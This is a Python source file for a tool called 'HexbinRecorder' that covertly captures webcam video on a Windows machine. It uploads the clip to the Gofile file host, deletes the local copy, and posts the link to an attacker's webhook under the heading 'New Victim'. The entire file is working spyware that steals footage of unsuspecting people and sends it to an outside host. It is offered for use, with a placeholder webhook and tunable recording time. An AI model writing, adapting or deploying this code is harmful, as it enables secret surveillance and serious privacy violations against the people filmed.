import os, cv2, requests, time, gofile2, datetime
import gofile2
class HexbinRecorder():
    def __init__(self):
        self.webhook = "WEBHOOK_HERE"
        self.filename = 'video.mp4'

        self.Recorder()

    def change_res(self, cap, width, height):
        cap.set(3, width)
        cap.set(4, height)
        
    def get_dims(self, cap, res='1080p'):
        STD_DIMENSIONS =  {
            "480p": (640, 480),
            "720p": (1280, 720),
            "1080p": (1920, 1080),
            "4k": (3840, 2160),
        }
        width, height = STD_DIMENSIONS["480p"]
        if res in STD_DIMENSIONS:
            width,height = STD_DIMENSIONS[res]
        self.change_res(cap, width, height)
        return width, height

    def Recorder(self):
        temp = os.path.join(f"{os.getenv('TEMP')}\\{self.filename}")
        res = '720p'
        t_end = time.time() + 2 #change this to the amount of time you want to record

        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            out = cv2.VideoWriter(temp, cv2.VideoWriter_fourcc(*'X264'), 25, self.get_dims(cap, res))
            while time.time() < t_end:
                ret, frame = cap.read()
                out.write(frame)
            cap.release()
            out.release()
            cv2.destroyAllWindows()
            g_a = gofile2.Gofile()
            videoUrl = g_a.upload(file=temp)
            self.webcam = f"**Webcam: [{videoUrl['downloadPage']}]({videoUrl['downloadPage']})**"
            os.remove(temp)
            self.WebhookSender(self.webcam)
        else:
            self.webcam = "**No Webcam found**"
            self.WebhookSender(self.webcam)

    def WebhookSender(self, webcam):
        today = datetime.date.today()
        alert = {
            "avatar_url":"https://i.imgur.com/QVCVjM4.png",
            "name":"Hexbin Recorder",
            "embeds": [
                {
                    "author": {
                        "name": "HexbinRecorder",
                        "icon_url": "https://i.imgur.com/QVCVjM4.png",
                        "url": "https://github.com/TryWarzFiles"
                        },
                    "description": f"New Victim 4K\n{webcam}",
                    "color": 8421504,
                    "footer": {
                      "text": f"github.com/TryWarzFiles・{today}"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=alert)

if __name__ == "__main__":
    HexbinRecorder()